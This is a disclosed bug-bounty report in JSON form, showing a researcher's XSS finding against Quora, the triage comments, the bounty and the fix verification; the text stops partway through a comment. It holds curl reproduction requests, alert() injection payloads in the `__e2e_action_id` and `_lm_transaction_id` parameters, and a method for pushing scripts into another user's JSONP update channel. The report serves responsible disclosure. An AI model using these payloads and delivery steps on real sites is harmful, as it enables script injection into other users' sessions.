@@ -1,0 +1,567 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-03-08T15:44:00.151Z", 
+    "voters": [
+        "jokebookservice1", 
+        "sp1d3rs", 
+        "michiel", 
+        "dawgyg", 
+        "bogdantcaciuc", 
+        "asad0x01_", 
+        "malcolmx", 
+        "eveeez", 
+        "muhammad_uwais", 
+        "mishre", 
+        "and 30 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "600.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 259100, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-03-08T18:54:17.925Z", 
+    "vulnerability_information": "#Summary:\n\nThe `__e2e_action_id` params used with POST requests to `/server_call_POST?_m=*` endpoint is not properly escaped when reflected back on a response allowing to inject Javascript.\nAlso, another issue on some methods (such as `/server_call_POST?_m=edit`) allows - with a *strong* premise discussed on the description - *any* authenticated user to deliver the vulnerability to another user without any interaction.\n\n# Description\n\n## XXS\nOn the Web Application http://www.quora.com most user actions are performed as POST on `/server_call_POST?_m=*`, implementing AJAX architecture.\nOn the client side these requests are processed by  `./shared/core/rpc.js` library that in turns uses the library `./actions.js` to define \"actions\" which have an ID `__e2e_action_id` and some methods such as startAction() and **finishAction(id, ...)**.  \nThe `__e2e_eaction_id` is generated for every request with `id = (1e3 * e.startTime + Math.floor(1e3 * Math.random())).toString(36)` so its value is intended to be composed by [0-9a-z].\n\nWhen a user performs an action, this ID is embedded on the POST request and with some methods (for\nexample `/server_call_POST?_m=load_menu`) its content is reflected back as first argument of\nfinishAction().  For example a \"normal\" call, with `__e2e_action_id=esko02tjqe` is the following (I've omitted most headers/params/data):\n\n```\ncurl 'https://www.quora.com/webnode2/server_call_POST?_v=####&_m=load_menu'  \n-data 'json=...&__e2e_action_id=esko02tjqe&...'\n\n> POST /webnode2/server_call_POST?_v=\u2588\u2588\u2588\u2588\u2588&_m=load_menu HTTP/1.1\n> Host: www.quora.com\n> Cookie: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n...\n< HTTP/1.1 200 OK\n< Content-Type: application/json; charset=utf-8\n< Server: nginx\n< \n{\"value\": {\n     \"html\": ..., \n      \"css\": .......,                             (\u2193\u2193\u2193\u2193\u2193\u2193 reflected ID)\n       \"js\": \"require('actions').finishAction('esko02tjqe', {\\\"controller\\\": \\\"webnode2\\\", \\\"action\\\": \\\"server_call_POST\\\", \\\"standard\\\": {}, \\\"serverTime\\\": 34511, \\\"mustReport\\\": true});\\n            var webnode = require('shared/core/webnode');\\n   ....     \"}, \n   \"pmsg\": null}\n```\nSince no escaping is performed, it is possible to inject code, for example setting `__e2e_action_id=',alert(),'` which will produce:\n```\n...\n \"js\": \"require('actions').finishAction('',alert(),'', {\\\"cont... \"}, \n...\n```\ncreating a valid js section that execute `alert()`.\nFortunately this vulnerability can't be triggered as it is because this would require the malformed request to be sent by Quora.com since it is `./shared/core/rpc.js` that execute the response (that has a content type of `application/json`) and seems that there is no way to directly set the `__e2e_action_id` on a session of Quora (a new one is generated  for each action).\n\n## Deliver the XSS using JSONP\n\nI've noticed another \"vulnerability\" that can be chained with the aforementioned to be able to effectively\ndeliver the XSS to an user.\nWhen an user is on Quora, to its page is associated a \"channel\" (I hope this is the correct name) such as `main-w-dep3105-32490323....` and there is always a request that try to fetch new \"update\" from a\nchannel (restarted each time it returns).  \nThis request is `update` on *.tch.quora.com, for example:\n\n```\nREQUEST\nhttps://tch969298.tch.quora.com/up/chan43-8888/updates?&callback=jsonp<callback_name>&channel=main-w-dep3105-32490323....&hash=16762940...\n\nPOSSIBLE RESPONSE:\njsonp<callback_name>({\"messages\":[\"require.whenReady(\\\"main\\\", function() {\\n ... ,\"min_seq\":1591113381})\n```\n\nThe action `/server_call_POST?_m=edit` (used for example when an user change its profile description), do not behave like `/server_call_POST?_m=load_menu` (described in the first section). What I mean is that they do not reply with the response `{\"value\": {\"html\": ..., \"css\": ...., \"js\": ...}, \"pmsg\": \"\"}` to update the page but they reply with a response `{\"value\": null, \"pmsg\": null}` and *deliver the update through a message on the channel of the user*.\n\nFor example after a `/server_call_POST?_m=edit` with `__e2e_action_id=eskrisktsq` the `/update?` request reply with:\n```\njsonp<callback_name>({\"messages\":[\"require.whenReady(\\\"main\\\", function()\n {require('actions').finishAction('eskrisktsq' ... <other data of the edit action>\n                                     \u2191\u2191\u2191\u2191\u2191\n             (__e2e_action_id of the _m=edit call reflected)\n     \n```\non which `eskrisktsq` is the `__e2e_action_id` used on the `_m=edit` call vulnerable to XSS.\nThe fact that `_m=edit` sent a message to the channel `main-w-dep3105-32490323....` it's because this channel is specified as parameter on the request `_m=edit`:\n```\ncurl 'https://www.quora.com/webnode2/server_call_POST?_v=\u2588\u2588\u2588\u2588\u2588\u2588\u2588&_m=edit' \n--data 'json={\n\"args\":[],\"kwargs\":{the data of the edit}}&\nrevision=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&\nformkey=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&\npostkey=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&\nwindow_id=dep3105-32490323....&                          \u2190 specified here\n_lm_window_id=dep3105-32490323....&                      \u2190   and here\n__e2e_action_id=eskrisktsq&\n&__vcon_json=[\u2588\u2588\u2588\u2588\u2588]&.....' \n```\n\nThe real problem is that this method **do not check if the specified channel is associated to user session who performed the call**. So what could happen is that the attacker can send the XSS to\na specified channel name that will be triggered as soon as the `update?` request (of the victim user) receives the evil data, without any interaction of the victim.\nThe *effect* of `_m=edit` (eg: change the profile description) is applied to the Attacker profile (since on the request are used Cookies, formkey and postkey of the Attacker) but *the finishAction() message* (vulnerable to XSS) is sent to the *victim* channel name.\n\nI can confirm that this behavior is not present on other methods: for example with `_m=load_menu` if you try to change the `window_id` you obtain a 500 Internal Server Error, this should demonstrate that there is some check missing on methods such as `_m=edit`.  \nI've not tested other methods, anyway I think that all the methods that reply with `{\"value\": null, \"pmsg\": null}` are vulnerable but not the ones that reply with the update directly (as `_m=load_menu` does) .\n\nThe *strong* premise said on the summary is that an attacker should know the victim channel_name and, that seems not easy to obtain, but if there are ways to do this, this vulnerability will become a serious problem since no victim interaction is required to perform the attack.\n\nAnyway is still possible to do a bruteforce on channel name spreading the attack on random users. To this end I want to call on your attention some pro/cons aspect for the attacker:\n\n   0. There could be easy ways that I did not find to leak valid channel_name\n   1. The attack can't be stopped from browser XSS filters\n   2. The XSS seems to work only on Quora.com (Android do not use `__e2e_action_id`, IOs not tested)\n   3. A channel_name is composed of `dep<4 digit[0-9]>-<up to 19 digit[0-9]>`. Valid 4 digits for `dep`\n can be leaked using `https://www.quora.com/check_livedeps/index?window_id=dep3304-`\n  that seems to respond with \"ok\" if the 4 digits (in this case 3304) are part of a channel alive.\n   4. the remaining part is infeasible to enumerate (10^19), but should be noted that:\n     -  doing the evil request returns an HTTP status code 200, so the attack can be distributed on multiple Attacker's Quora Profiles created for the attack, and metrics such as increased error rate (http 500) do not highlight any attack.\n     - if the XSS is sent to a channel_name that is not used by any user and Quora assigns this\n       channel_name, up to 5minutes **later** the evil request was sent, the XSS is delivered correctly.\n       (BTW I do not know if Quora would assign a channel name on which a message is already \"pending\")\n     -I think the attacker can keep busy some channels name (reducing the space to enumerate),\nlogging and executing the same code that Quora uses to attach a channel to an user, e.g:   \n\n````\n require(\"tchannel_up\").start(0, \"main-w-dep3104-34040...\", \"2287....\", \"chan42-8888\", \"quora.com\", \"\");\n\nor simply a repeated GET on:\n\nhttps://tch969298.tch.quora.com/up/chan42-8888/updates?&callback=jsonp<callback_name>&channel=main-w-dep3104-34040...&hash=2287....\n```` \nsince seems that there isn't a limit on how much \"active\" channel are reserved for a user session (I've not tried extensively, but i've executed 3 time the code with channel saved from past session - since you need the `hash` params - and works).\n\n\n### Steps To Reproduce\n\nI describe the steps using browser Chromium, but it is not stricly necessary\n\n1. Attacker log in on Quora.com and goes on its profile page \n2. Attacker open developer tools of its browser and goes on the \"Network\" tab\n3. Attacker update its profile description using dummy data and copy the request performed on `server_call_POST?_m=edit`, eg:\n    \n    ```curl 'https://www.quora.com/webnode2/server_call_POST?_v=2rtUq6Z4HO9gWK&_m=edit' -H 'Cookie: m-b=\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"; m-sa=1; m-s=\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"; m-screen_size=1920x1080; m-login=1; m-ju=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; m-early_v=4e4c117b82baf40e; m-tz=-120; m-css_v=69026465bc2615b6; m-wf-loaded=q-icons-q_serif; _ga=GA1.2.2058437224.1502195915; _gid=GA1.2.1848940326.1502195915' -H 'Origin: https://www.quora.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://www.quora.com/profile/Aleph-NaN' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'DNT: 1' --data 'json={\"args\":[],\"kwargs\":{\"id\":\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588,\"input\":{\"sections\":[{\"type\":\"plain\",\"indent\":0,\"quoted\":false,\"spans\":[{\"modifiers\":{},\"text\":\"a\"}]}],\"caret\":{\"start\":{\"spanIdx\":0,\"sectionIdx\":0,\"offset\":1},\"end\":{\"spanIdx\":0,\"sectionIdx\":0,\"offset\":1}}}}}&revision=904d048187b642341464067b64246119b8ce9489&formkey=6a34c75ed7fda8439ca2407b4520c974&postkey=736f2eea9e3826808823625bf4ede215&window_id=dep3204-1727465467565139446&referring_controller=user&referring_action=profile&_lm_transaction_id=0.7159021828610441&_lm_window_id=dep3204-1727465467565139446&__vcon_json=[\"2rtUq6Z4HO9gWK\"]&__vcon_method=edit&__e2e_action_id=esl2xq4xyj&js_init={\"id\":\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588,\"input\":\"user_description_text\",\"typing_area\":null,\"draft_space\":null,\"unsaved_content_msg\":\"Your content has not been saved.\",\"focus_onload\":false,\"is_qtext\":true,\"require_comment\":false,\"require_value\":false,\"content_type\":null,\"submit_text\":\"Update\",\"show_editor\":false}&__metadata={}' --compressed ```\n4. the attacker obtain the victim channel name, eg: `dep3501-3261853912009855464`\n5. the attacker modify its previusly copied request, setting the `window_id` and `_lm_window_id` parameters to the victim channel name\n6. the attacker modify the request, setting the `__e2e_action_id` parameter to inject its javascript payload, for example to `',alert(1),'`, eg: \n    ```curl 'https://www.quora.com/webnode2/server_call_POST?_v=2rtUq6Z4HO9gWK&_m=edit' -H 'Cookie: m-b=\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"; m-sa=1; m-s=\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"; m-screen_size=1920x1080; m-login=1; m-ju=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; m-early_v=4e4c117b82baf40e; m-tz=-120; m-css_v=69026465bc2615b6; m-wf-loaded=q-icons-q_serif; _ga=GA1.2.2058437224.1502195915; _gid=GA1.2.1848940326.1502195915' -H 'Origin: https://www.quora.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://www.quora.com/profile/\u2588\u2588\u2588\u2588' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'DNT: 1' --data 'json={\"args\":[],\"kwargs\":{\"id\":\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588,\"input\":{\"sections\":[{\"type\":\"plain\",\"indent\":0,\"quoted\":false,\"spans\":[{\"modifiers\":{},\"text\":\"a\"}]}],\"caret\":{\"start\":{\"spanIdx\":0,\"sectionIdx\":0,\"offset\":1},\"end\":{\"spanIdx\":0,\"sectionIdx\":0,\"offset\":1}}}}}&revision=904d048187b642341464067b64246119b8ce9489&formkey=6a34c75ed7fda8439ca2407b4520c974&postkey=736f2eea9e3826808823625bf4ede215&window_id=dep3501-3261853912009855464&referring_controller=user&referring_action=profile&_lm_transaction_id=0.7159021828610441&_lm_window_id=dep3501-3261853912009855464&__vcon_json=[\"2rtUq6Z4HO9gWK\"]&__vcon_method=edit&__e2e_action_id=\\',alert(1),\\'&js_init={\"id\":\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588,\"input\":\"user_description_text\",\"typing_area\":null,\"draft_space\":null,\"unsaved_content_msg\":\"Your content has not been saved.\",\"focus_onload\":false,\"is_qtext\":true,\"require_comment\":false,\"require_value\":false,\"content_type\":null,\"submit_text\":\"Update\",\"show_editor\":false}&__metadata={}' --compressed ```\n7. the attacker send the request\n8. on the victim page will be executed `alert(1)`\n\nNotice that the cookie, postkey, formkey and other data are of the attacker session.\n\n### Enviroment\nTools used: `curl` and `chromium`\n\n### Suggested fix\n- correctly escape `__e2e_action_id`\n- do not allow to specify a channel name (`window_id` parameter) that is not \"attached\" to the session of the caller\n\n\nI can provide a demonstrating video if required or other info. \nThe severity was calculated with the Hackerone Calculator.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "low", 
+        "author_type": "Team"
+    }, 
+    "title": "XSS through `__e2e_action_id` delivered by JSONP", 
+    "is_member_of_team?": null, 
+    "vote_count": 40, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": null, 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$600", 
+    "singular_disclosure_disabled": true, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-16T23:14:25.932Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-16T23:14:25.932Z", 
+            "actor": {
+                "username": "0xnan", 
+                "url": "/0xnan", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "Hi quora team, i've re-read the report and hoping everything is clear I wish to hear news from you soon. Many thanks", 
+            "markdown_message": "<p>Hi quora team, i&#39;ve re-read the report and hoping everything is clear I wish to hear news from you soon. Many thanks</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1934893, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-18T15:10:27.206Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-18T15:10:27.206Z", 
+            "actor": {
+                "username": "0xnan", 
+                "url": "/0xnan", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "Here is a demonstrating video https://youtu.be/Y9e9cULNs6I", 
+            "markdown_message": "<p>Here is a demonstrating video <a title=\"https://youtu.be/Y9e9cULNs6I\" href=\"/redirect?signature=5c4d3e060a9e39f2f38f9e92b5d03f2980f55632&amp;url=https%3A%2F%2Fyoutu.be%2FY9e9cULNs6I\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://youtu.be/Y9e9cULNs6I</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1939107, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-18T20:56:30.660Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-18T20:56:30.660Z", 
+            "actor": {
+                "username": "sriram-quora", 
+                "url": "/sriram-quora", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Low", 
+                "old_severity": "Medium (5.6)"
+            }, 
+            "team_handle": "quora", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 1940021, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-18T20:58:39.368Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-18T20:58:39.368Z", 
+            "actor": {
+                "username": "sriram-quora", 
+                "url": "/sriram-quora", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "Thanks for the report. I am lowering the priority since the attack requires a certain amount of brute forcing with the window id and since the window id has large enough entropy this is not easy.", 
+            "markdown_message": "<p>Thanks for the report. I am lowering the priority since the attack requires a certain amount of brute forcing with the window id and since the window id has large enough entropy this is not easy.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 1940026, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-08-18T21:05:09.505Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-18T21:05:09.505Z", 
+            "actor": {
+                "url": "/quora", 
+                "profile": {
+                    "name": "Quora"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/152/b45d3ae0a0f8972e946e307080222878b2016c7e_medium.png?1439494590"
+                }
+            }, 
+            "team_handle": "quora", 
+            "bonus_amount": "400.0", 
+            "bounty_amount": "100.0", 
+            "collaborator": {
+                "username": "0xnan", 
+                "url": "/0xnan"
+            }, 
+            "message": "Adding a bonus for detailed report.", 
+            "markdown_message": "<p>Adding a bonus for detailed report.</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1940033, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-18T21:06:05.361Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-18T21:06:05.361Z", 
+            "actor": {
+                "username": "sriram-quora", 
+                "url": "/sriram-quora", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "This should be fixed now. Can you verify?", 
+            "markdown_message": "<p>This should be fixed now. Can you verify?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1940037, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-18T21:13:59.876Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-18T21:13:59.876Z", 
+            "actor": {
+                "username": "0xnan", 
+                "url": "/0xnan", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "I will check and let you know in a few hours. Thank you very much  for the bounty and the bonus!", 
+            "markdown_message": "<p>I will check and let you know in a few hours. Thank you very much  for the bounty and the bonus!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1940058, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-19T19:01:28.562Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-19T19:01:28.562Z", 
+            "actor": {
+                "username": "0xnan", 
+                "url": "/0xnan", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "Hi @sriram-quora \nsorry for the delay but I wanted to take more time to deeply check the fix.\n\nI can confirm that the `__e2e_action_id` params is correctly escaped now, resulting in a 500 Internal Server Error if any of its char is outside [0-9a-z], \ni've checked with different char sets and seems ok. \nHowever I want to point out that there isn't any check obout the *length* of the field: it should be secure, but a simple limit can reduce the space of possibile misuses.\n\nI've noticed that is still possible to use a `window_id` of another user allowing an attacker to send messages (the responses of some methods) to other user.\nI've suggested to not allow such behaviour, but since I do not know the system's core I don know if it is a crucial aspect of the application (I suspect that there isn't any easy way to know if a `window_id` was associated to a specific user, maybe to maintains services stateless).\n\nAnyway since I think this is an intresting vector for an attacker, I've invested other time to understand which methods can send such messages and to help you if you think is the case to find be better way to secure this aspect.\nFortunately this work has highlighted another issue that can be quickly solved.\n\nI've recorded 30+ differents `server_call_POST` requests each of which with a different method. \nI've repeated each request setting a different `window_id` (of a different Quora user), and for each of those i've cheked if (and what) the `update` request (attached to the `window_id` used) returns.\nI've done some cross checks on the requests sent and the responses obtained, finding if there were other attacker-controlled data reflected back, and then checked if it were properly escaped.\n\nThis work highlighted **another parameter not escaped**: `_lm_transaction_id`.\nIt allows - in the same way of `__e2e_action_id` to inject javascript.\n\nFor example after a request `https://www.quora.com/webnode2/server_call_POST?_m=unfollow` with `_lm_transaction_id=0.8950069046032785` the `update` request returns with:\n\n```\njsonpc5010ec7bc014f198da3e75103cfd500({\"messages\":[\"require.whenReady(\\\"main\\\", function() {require('actions').finishAction('estsq43h0v', {\\\"controller\\\": \\\"webnode2\\\", \\\"action\\\": \\\"server_call_POST\\\", \\\"standard\\\": {\\\"server_side\\\": 200, \\\"e2e\\\": 500, \\\"owner\\\": 28, \\\"server_side_goal\\\": null}, \\\"serverTime\\\": 2339268, \\\"mustReport\\\": true});\\n             require(\\\"w2.livenode\\\").mutationDoneAfterVersion(0.8950069046032785,0);\\n        });\"],\"min_seq\":2980706171})\n```\nsimply setting `_lm_transaction_id=alert(1)` will trigger the XSS.\n\nThe value of `_lm_transaction_id` is initialized to `Math.random()` so a simple check to ensure that is a number should fix the escaping issue.\n\n\nTo help you to understand what kind of requests suffer of these escaping errors,\nthe following is a list of `server_call_POST` methods that reflect back the vulnerable `_lm_transaction_id` and the -now secure- `__e2e_action_id`:\n\n- add_topic\n- attach_decline_reason\n- clear_draft\n- dialog_submit_controller\n- edit\n- flag_object\n- follow\n- mark_as_cant_answer\n- mark_as_seen\n- press\n- request\n- revert_revision\n- submit\n- unfollow\n- unpress\n- update\n\nAnother method reflect only the vulnerable `_lm_transaction_id`:\n\n- update_access_token\n\nothers reflect only `__e2e_action_id`:\n\n- increase_count\n\nwhile others seems do not reflect any of these params, since no message is sent to `update` after these requests:\n\n- choose_photo\n- clear_badge\n- decline_modal\n- fetch_toggled_component\n- flag_modal\n- get_edit_wrapper\n- get_next_page\n- load_menu\n- load_modal\n- log_highlight_error\n- log_private_views\n- results_content_for\n- saved_results_content_for\n- set_dialog_contents\n- upload\n\n###summing up I suggest\n- to check the length of `__e2e_action_id`\n- to fix the escaping of this new parameter\n- to understand if this mechanism to send data can have others security implication or to not allow to use others `window_id`\n\nI'm wondering if this new parameter can be rewarded with a bounty? \nLet me know if you need more informations or when it is fixed, I will re-check.\n\nThank you, I learned new things ^^ (and sorry for my english) \n\n", 
+            "markdown_message": "<p>Hi <a href=\"/sriram-quora\">@sriram-quora</a> <br>\nsorry for the delay but I wanted to take more time to deeply check the fix.</p>\n\n<p>I can confirm that the <code>__e2e_action_id</code> params is correctly escaped now, resulting in a 500 Internal Server Error if any of its char is outside [0-9a-z], <br>\ni&#39;ve checked with different char sets and seems ok. <br>\nHowever I want to point out that there isn&#39;t any check obout the <em>length</em> of the field: it should be secure, but a simple limit can reduce the space of possibile misuses.</p>\n\n<p>I&#39;ve noticed that is still possible to use a <code>window_id</code> of another user allowing an attacker to send messages (the responses of some methods) to other user.<br>\nI&#39;ve suggested to not allow such behaviour, but since I do not know the system&#39;s core I don know if it is a crucial aspect of the application (I suspect that there isn&#39;t any easy way to know if a <code>window_id</code> was associated to a specific user, maybe to maintains services stateless).</p>\n\n<p>Anyway since I think this is an intresting vector for an attacker, I&#39;ve invested other time to understand which methods can send such messages and to help you if you think is the case to find be better way to secure this aspect.<br>\nFortunately this work has highlighted another issue that can be quickly solved.</p>\n\n<p>I&#39;ve recorded 30+ differents <code>server_call_POST</code> requests each of which with a different method. <br>\nI&#39;ve repeated each request setting a different <code>window_id</code> (of a different Quora user), and for each of those i&#39;ve cheked if (and what) the <code>update</code> request (attached to the <code>window_id</code> used) returns.<br>\nI&#39;ve done some cross checks on the requests sent and the responses obtained, finding if there were other attacker-controlled data reflected back, and then checked if it were properly escaped.</p>\n\n<p>This work highlighted <strong>another parameter not escaped</strong>: <code>_lm_transaction_id</code>.<br>\nIt allows - in the same way of <code>__e2e_action_id</code> to inject javascript.</p>\n\n<p>For example after a request <code>https://www.quora.com/webnode2/server_call_POST?_m=unfollow</code> with <code>_lm_transaction_id=0.8950069046032785</code> the <code>update</code> request returns with:</p>\n<pre class=\"highlight plaintext\"><code>jsonpc5010ec7bc014f198da3e75103cfd500({&quot;messages&quot;:[&quot;require.whenReady(\\&quot;main\\&quot;, function() {require(&#39;actions&#39;).finishAction(&#39;estsq43h0v&#39;, {\\&quot;controller\\&quot;: \\&quot;webnode2\\&quot;, \\&quot;action\\&quot;: \\&quot;server_call_POST\\&quot;, \\&quot;standard\\&quot;: {\\&quot;server_side\\&quot;: 200, \\&quot;e2e\\&quot;: 500, \\&quot;owner\\&quot;: 28, \\&quot;server_side_goal\\&quot;: null}, \\&quot;serverTime\\&quot;: 2339268, \\&quot;mustReport\\&quot;: true});\\n             require(\\&quot;w2.livenode\\&quot;).mutationDoneAfterVersion(0.8950069046032785,0);\\n        });&quot;],&quot;min_seq&quot;:2980706171})\n</code></pre>\n<p>simply setting <code>_lm_transaction_id=alert(1)</code> will trigger the XSS.</p>\n\n<p>The value of <code>_lm_transaction_id</code> is initialized to <code>Math.random()</code> so a simple check to ensure that is a number should fix the escaping issue.</p>\n\n<p>To help you to understand what kind of requests suffer of these escaping errors,<br>\nthe following is a list of <code>server_call_POST</code> methods that reflect back the vulnerable <code>_lm_transaction_id</code> and the -now secure- <code>__e2e_action_id</code>:</p>\n\n<ul>\n<li>add_topic</li>\n<li>attach_decline_reason</li>\n<li>clear_draft</li>\n<li>dialog_submit_controller</li>\n<li>edit</li>\n<li>flag_object</li>\n<li>follow</li>\n<li>mark_as_cant_answer</li>\n<li>mark_as_seen</li>\n<li>press</li>\n<li>request</li>\n<li>revert_revision</li>\n<li>submit</li>\n<li>unfollow</li>\n<li>unpress</li>\n<li>update</li>\n</ul>\n\n<p>Another method reflect only the vulnerable 